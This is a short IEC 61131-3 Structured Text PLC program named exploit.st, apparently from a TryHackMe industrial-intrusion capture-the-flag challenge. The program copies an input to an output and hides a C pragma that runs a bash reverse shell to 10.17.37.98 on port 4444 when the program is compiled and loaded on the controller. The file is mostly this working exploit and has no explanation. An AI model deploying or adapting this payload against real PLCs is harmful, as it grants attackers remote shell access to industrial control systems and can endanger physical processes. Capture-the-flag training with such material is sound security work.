(* IEC 61131-3 sources: site/src/data/events/2025/tryhackme-industrial-intrusion-ctf/ot/kaboom, 1 file *)

(* ---- exploit.st ---- *)
PROGRAM prog0
  VAR
    var_in : BOOL;
    var_out : BOOL;
  END_VAR

  var_out := var_in;

  { system("bash -c 'bash -i >& /dev/tcp/10.17.37.98/4444 0>&1'"); }
END_PROGRAM

CONFIGURATION Config0

  RESOURCE Res0 ON PLC
    TASK Main(INTERVAL := T#50ms,PRIORITY := 0);
    PROGRAM Inst0 WITH Main : prog0;
  END_RESOURCE
END_CONFIGURATION
